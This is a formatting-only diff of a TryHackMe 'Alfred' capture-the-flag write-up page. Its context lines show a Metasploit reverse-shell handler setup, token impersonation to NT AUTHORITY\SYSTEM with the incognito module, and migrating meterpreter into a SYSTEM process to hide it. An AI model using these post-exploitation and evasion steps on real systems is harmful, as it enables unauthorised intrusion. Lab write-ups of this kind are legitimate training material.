@@ -920,7 +920,7 @@ msf6 <span class="nb">set </span>LHOST <span class="o">{</span>THM IM<span class
 msf6 <span class="nb">set </span>LPORT <span class="o">{</span>THE PORT DECLARED FOR EXECUTABLE BEFORE<span class="o">}</span>
 msf6 run</code></pre></figure>
 
-<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png" alt="" /></p>
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png" alt="" /><br /></p>
 <ul>
   <li>After successfully receiving the meterpreter console, load the incognito module.
 <br />Run:</li>
@@ -944,12 +944,13 @@ Delegation and impersonation levels are identical locally.</p>
 <p>If everything were successfully done, <strong>NT AUTHORITY\SYSTEM</strong> should be the output of the <strong>getuid</strong> command.
 <img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png" alt="" /></p>
 <ul>
-  <li>Run <strong>ps</strong> to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.
-<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png" alt="" />
-By doing that, we have camouflaged our malicious process into a safer looking one.
-<br /><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png" alt="" />
-<br />To get the root flag, run:</li>
+  <li>Run <strong>ps</strong> to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.</li>
 </ul>
+
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png" alt="" /><br />
+By doing that, we have camouflaged our malicious process into a safer looking one.
+<br /><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png" alt="" /><br />
+<br />To get the root flag, run:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">onfig</span><span class="se">\r</span><span class="s2">oot.txt"</span></code></pre></figure>
 
